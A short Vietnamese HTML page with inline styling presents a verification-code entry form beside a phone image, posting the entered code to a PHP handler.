
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Xác nhận mã</title>
  <style>
    body { margin: 0; font-family: system-ui, sans-serif; background: #eee; }
    .container { width: 900px; margin: 60px auto; background: #fff; border-radius: 10px;
      overflow: hidden; display: flex; box-shadow: 0 0 30px rgba(0,0,0,0.2); }
    .left { flex: 1; background: #000; }
    .left img { width: 100%; height: 100%; object-fit: cover; }
    .right { flex: 1; padding: 40px; display: flex; flex-direction: column; justify-content: center; }
    h2 { margin-bottom: 20px; }
    input, button {
      padding: 12px; width: 100%; margin-bottom: 15px; border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      background: #000; color: #fff; border: none; font-weight: bold; cursor: pointer;
    }
  </style>
</head>
<body>
<div class="container">
  <div class="left"><img src="https://vatvostudio.vn/wp-content/uploads/2023/10/Flagship-2023.jpg" alt="Phone Image"></div>
  <div class="right">
    <h2>Nhập mã xác nhận</h2>
    <form method="POST" action="check_code.php">
      <input type="text" name="code" placeholder="Mã xác nhận">
      <button type="submit">Xác nhận</button>
    </form>
  </div>
</div>
</body>
</html>
    




